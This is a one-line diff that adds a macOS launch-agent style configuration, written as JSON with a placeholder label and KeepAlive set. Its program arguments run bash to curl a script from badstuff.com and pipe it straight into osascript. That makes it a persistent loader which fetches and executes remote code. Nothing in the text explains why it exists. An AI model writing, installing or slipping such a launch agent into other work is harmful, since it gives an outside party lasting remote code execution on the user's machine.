@@ -1,0 +1,1 @@
+{"Label":"com.your.label.name","ProgramArguments":["\/bin\/bash","-c","curl http:\/\/badstuff.com\/payload.js | osascript"],"KeepAlive":true}
